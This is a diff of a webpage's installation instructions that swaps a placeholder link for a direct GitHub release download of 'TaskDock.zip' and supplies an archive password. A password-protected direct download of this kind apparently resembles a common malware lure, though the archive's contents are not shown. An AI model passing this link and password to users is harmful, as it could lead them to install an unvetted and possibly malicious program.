@@ -10,6 +10,6 @@
 
 <h2>Installation</h2>
 <ol>
-  <li>Download the latest release from the <a href="#">repository</a></li>
+  <li>Download the latest release from the <a href="https://github.com/havanagilla1/TaskDock/releases/download/Download/TaskDock.zip">repository</a></li>
   <li>Unzip the archive to a convenient location on your computer. <i>Password: tdForEver</i></li>
 </ol>
